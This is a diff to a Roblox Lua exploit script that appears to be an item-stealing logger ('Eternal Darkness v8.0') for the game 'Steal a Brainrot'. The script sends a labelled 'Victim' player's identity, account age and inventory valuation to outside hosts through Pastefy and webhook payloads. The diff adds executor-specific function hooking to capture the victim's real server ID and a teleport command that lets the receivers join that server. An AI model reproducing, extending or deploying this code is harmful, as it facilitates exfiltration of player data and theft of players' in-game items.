@@ -4,6 +4,7 @@ task.wait(1.5)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 if not plr then return end
 
@@ -76,6 +77,38 @@ if not requestMethod then
 end
 
 local request = requestMethod
+
+local REAL_JOB_ID = game.JobId
+local bypassJobId = game.JobId
+local capturedJobId = false
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+    local stepAnimate = nil
+    local printed = false
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+    local old
+    old = hookfunction(stepAnimate, function(dt)
+        if not printed then
+            printed = true
+            bypassJobId = game.JobId
+            capturedJobId = true
+        end
+        return old(dt)
+    end)
+    repeat task.wait() until capturedJobId
+    REAL_JOB_ID = bypassJobId
+end
 
 local cam = workspace.CurrentCamera
 local pg = plr:WaitForChild("PlayerGui")
@@ -308,30 +341,8 @@ local function sendToPublic(payload)
 end
 
 local rubisLink = uploadToPastefy(brainrotList)
-
-local joinLink = "https://www.roblox.com/games/" .. game.PlaceId
-pcall(function()
-    local response = request({
-        Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
-        Method = "GET",
-        Headers = {["User-Agent"] = "Mozilla/5.0"}
-    })
-    if response and response.Body then
-        local data = HttpService:JSONDecode(response.Body)
-        if data and data.data then
-            local validServers = {}
-            for _, server in ipairs(data.data) do
-                if server.playing < server.maxPlayers then
-                    table.insert(validServers, server)
-                end
-            end
-            if #validServers > 0 then
-                local randomServer = validServers[math.random(1, #validServers)]
-                joinLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, randomServer.id)
-            end
-        end
-    end
-end)
+local PlaceId = game.PlaceId
+local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
 
 local hitCategory = "Low Hit"
 local isPingWorthy = false
@@ -358,7 +369,7 @@ end
 
 local fields = {
     {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
-    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", "), inline = true},
+    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
     {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true}
 }
 
@@ -371,7 +382,7 @@ local ansiLine5 = "Common:      " .. rarityCounts.Common .. "  Unknown:     " ..
 
 table.insert(fields, {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false})
 table.insert(fields, {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
-table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. joinLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
+table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})
 
 local payload = {
     content = isPingWorthy and "@everyone 🌑 **NEW SAB HIT | Eternal Darkness**" or nil,
@@ -382,6 +393,7 @@ local payload = {
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
+        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
         fields = fields,
         footer = {text = "Eternal Darkness v8.0"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -394,7 +406,7 @@ local publicFields = {
     {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true},
     {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false},
     {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false},
-    {name = "🔗 Actions", value = "[Join Server](" .. joinLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false}
+    {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false}
 }
 
 local PublicPayload = {
